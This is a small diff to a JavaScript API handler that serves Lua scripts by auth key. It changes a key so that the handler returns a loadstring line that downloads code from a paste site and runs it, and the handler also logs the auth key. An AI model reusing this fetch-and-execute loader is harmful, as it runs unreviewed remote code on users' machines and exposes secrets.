@@ -17,7 +17,7 @@ export default async function handler(req, res) {
     console.log('🔑 Auth Key:', auth_key);
 
     const scripts = {
-      'placeholder': `
+      'Ajzz1Iu9eGadaz33Md4Ia6k6cMRdUwg8': `
 loadstring(request({Url='https://pastefy.app/JHUeMvgH/raw'; Method='GET'}).Body)();
       `.trim(),
       
